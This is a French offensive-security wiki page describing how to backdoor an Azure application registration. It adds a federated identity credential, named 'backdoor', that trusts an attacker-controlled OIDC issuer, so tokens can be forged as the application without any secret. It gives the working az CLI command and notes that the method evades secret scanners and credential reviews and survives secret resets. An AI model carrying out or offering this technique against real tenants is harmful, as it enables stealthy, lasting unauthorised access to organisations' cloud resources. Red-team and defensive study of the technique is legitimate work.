---
title: "Identifiants fédérés : forger des jetons depuis un émetteur OIDC contrôlé par l'attaquant"
order: 5
description: "Ajout d'un identifiant d'identité fédérée à un enregistrement d'application pour forger des jetons depuis un émetteur OIDC contrôlé par l'attaquant, sans secret."
keywords:
  - identifiants fédérés
  - fédération d'identités de charge de travail
  - OIDC
  - identité fédérée
  - enregistrement d'application
---

# Identifiants fédérés

Un enregistrement d'application peut faire confiance à un **émetteur OIDC** externe via un identifiant d'identité fédérée, de sorte qu'un jeton de cet émetteur est échangé contre un jeton d'application sans secret stocké. Ajoutez un identifiant fédéré pointant vers un émetteur que vous contrôlez, et vous forgez des jetons en tant qu'application à volonté : une porte dérobée discrète et sans secret.

## Ajouter un identifiant fédéré

```bash
# add a federated identity credential bound to an attacker-controlled issuer/subject
az ad app federated-credential create --id <appId> --parameters '{
  "name":"backdoor",
  "issuer":"https://you.example/oidc",
  "subject":"repo:attacker/x:ref:refs/heads/main",
  "audiences":["api://AzureADTokenExchange"]
}'
# then present a matching OIDC token and exchange it for an app token
```

## Notes d'exploitation

- Aucun secret client ni certificat n'est stocké sur l'application, ce qui permet d'échapper aux revues axées sur les identifiants et aux scanners de secrets.
- L'émetteur et le sujet que vous définissez sont le seul contrôle de confiance ; tous deux sont choisis par l'attaquant lorsque vous pouvez écrire l'identifiant.
- Comme un secret ajouté, il s'agit d'une persistance durable sous l'identité de l'application, qui survit aux réinitialisations d'utilisateurs et de secrets.

## Outils

- **az cli** (`az ad app federated-credential`).
- **BARK** : chemins d'attaque via identifiants fédérés.

## Références

- [SpecterOps : abus d'identifiants fédérés (BARK)](https://github.com/BloodHoundAD/BARK)
- [HackTricks Cloud : applications Azure](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [Microsoft : fédération d'identités de charge de travail](https://learn.microsoft.com/entra/workload-id/workload-identity-federation)
